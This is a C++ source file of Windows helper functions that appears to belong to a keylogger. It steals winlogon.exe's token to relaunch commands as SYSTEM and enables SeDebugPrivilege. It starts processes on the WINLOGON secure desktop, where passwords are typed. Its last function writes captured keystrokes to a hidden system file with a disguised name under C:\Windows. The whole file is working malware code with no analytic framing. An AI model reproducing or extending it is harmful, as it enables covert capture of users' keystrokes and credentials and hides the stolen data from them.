#include "functions.h"
#include <ctime>
#include <sddl.h>
#include <tlhelp32.h>

bool isRunningAsSystem()
{
	HANDLE hToken = NULL;
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
		return false;

	BYTE buf[512];
	DWORD sz = 0;
	if (!GetTokenInformation(hToken, TokenUser, buf, sizeof(buf), &sz))
	{
		CloseHandle(hToken);
		return false;
	}
	CloseHandle(hToken);

	PTOKEN_USER ptu = (PTOKEN_USER)buf;
	LPWSTR sidStr = NULL;

	ConvertSidToStringSid(ptu->User.Sid, &sidStr);
	const bool result = (wcscmp(sidStr, L"S-1-5-18") == 0);
	LocalFree(sidStr);
	return result;
}

bool EnablePrivileges(LPCWSTR priv)
{
	HANDLE hToken = NULL;
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
		return false;

	TOKEN_PRIVILEGES tp = { 1 };
	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	if (!LookupPrivilegeValue(NULL, priv, &tp.Privileges[0].Luid))
	{
		CloseHandle(hToken);
		return false;
	}

	bool result = AdjustTokenPrivileges(hToken, FALSE, &tp,
		sizeof(tp), NULL, NULL);

	CloseHandle(hToken);

	return result && GetLastError() == ERROR_SUCCESS;
}

bool RelaunchAsSystem(const std::wstring cmdLine)
{

	DWORD winlogonPID = 0;
	PROCESSENTRY32 pe = { sizeof(PROCESSENTRY32) };
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnapshot == INVALID_HANDLE_VALUE) return false;

	if (Process32First(hSnapshot, &pe))
	{
		do
		{
			if (_wcsicmp(pe.szExeFile, L"winlogon.exe") == 0)
			{
				CloseHandle(hSnapshot);
				winlogonPID = pe.th32ProcessID;
			}

		} while (Process32Next(hSnapshot, &pe));
	}
	CloseHandle(hSnapshot);
	if (!winlogonPID) return false;

	if (!EnablePrivileges(SE_DEBUG_NAME)) return false;

	HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, winlogonPID);
	if (!hProc) return false;

	HANDLE hTok = NULL;
	if (!OpenProcessToken(hProc, TOKEN_DUPLICATE, &hTok))
	{
		CloseHandle(hProc);
		return false;
	}

	SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, FALSE };
	HANDLE hNewTok = NULL;
	if (!DuplicateTokenEx(hTok, TOKEN_ALL_ACCESS, &sa, SecurityImpersonation, TokenPrimary, &hNewTok))
	{
		CloseHandle(hProc);
		CloseHandle(hTok);
		return false;
	}

	STARTUPINFOW si = { sizeof(si) };
	si.lpDesktop = (LPWSTR)L"winsta0\\default";
	PROCESS_INFORMATION pi = {};

	bool created = CreateProcessWithTokenW(hNewTok, 0, NULL,
		(LPWSTR)cmdLine.c_str(), 0,
		NULL, NULL, &si, &pi);

	CloseHandle(hProc);
	CloseHandle(hTok);
	CloseHandle(hNewTok);

	if (!created) return false;

	CloseHandle(pi.hThread);
	CloseHandle(pi.hProcess);

	return true;

}

bool RelaunchWithWINLOGONDesktop(const std::wstring cmdLine)
{
	STARTUPINFOW si = { sizeof(STARTUPINFOW) };
	si.lpDesktop = (LPWSTR)L"WINSTA0\\WINLOGON";
	PROCESS_INFORMATION pi = {};

	if (!CreateProcess(NULL, (LPWSTR)cmdLine.c_str(), NULL, NULL,
		FALSE, 0, NULL, NULL, &si, &pi))
		return false;

	CloseHandle(pi.hThread);
	CloseHandle(pi.hProcess);

	return true;
}

std::wstring GetCurrentDesktopName()
{
	HDESK hDesk = GetThreadDesktop(GetCurrentThreadId());
	if (!hDesk) return L"Unknow";

	DWORD needed = 0;
	GetUserObjectInformation(hDesk, UOI_NAME, NULL, 0, &needed);
	if (needed == 0) return L"Noname";

	std::wstring name;
	name.resize(needed / sizeof(wchar_t));

	if (GetUserObjectInformation(hDesk, UOI_NAME, (LPVOID)name.data(), needed, &needed))
	{
		name.resize(wcsnlen(name.data(), name.size()));
		return name;
	}

	return L"Error";
}

void DisableBlinkingCursor()
{
	HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
	CONSOLE_CURSOR_INFO cursorInfo;

	GetConsoleCursorInfo(hConsole, &cursorInfo);
	cursorInfo.bVisible = false;
	SetConsoleCursorInfo(hConsole, &cursorInfo);
}

std::wstring StringToWString(const std::string& str) {
	int size_needed = MultiByteToWideChar(CP_UTF8, 0, str.c_str(), -1, NULL, 0);
	std::wstring wstr(size_needed, 0);
	MultiByteToWideChar(CP_UTF8, 0, str.c_str(), -1, &wstr[0], size_needed);
	wstr.resize(wstr.size() - 1);
	return wstr;
}

std::string GetCurrentTimeAsString() {
	time_t now = time(0);
	struct tm timeinfo;
	char buffer[80];
	localtime_s(&timeinfo, &now);
	strftime(buffer, sizeof(buffer), "%Y-%m-%d %H:%M:%S", &timeinfo);
	return std::string(buffer);
}

bool CreateDirectoryRecursive(const std::wstring& path)
{
	size_t pos = 0;
	std::wstring sub;
	do
	{
		pos = path.find_first_of(L"\\/", pos + 1);
		sub = path.substr(0, pos);
		if (sub.empty()) continue;
		CreateDirectory(sub.c_str(), NULL);
	} while (pos != std::wstring::npos);
	return true;
}

bool WriteKeyLogToLogFileSystemHidden(const std::string &data)
{
	HANDLE hFile = CreateFileW(LR"(C:\Windows\IdentityCRL\production\windaft64.win)",
		FILE_APPEND_DATA, FILE_SHARE_READ, NULL,
		OPEN_ALWAYS, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM,
		NULL);

	if (hFile == INVALID_HANDLE_VALUE) return false;

	DWORD written = 0;
	WriteFile(hFile, data.c_str(), data.length(), &written, NULL);
	CloseHandle(hFile);

	return true;
}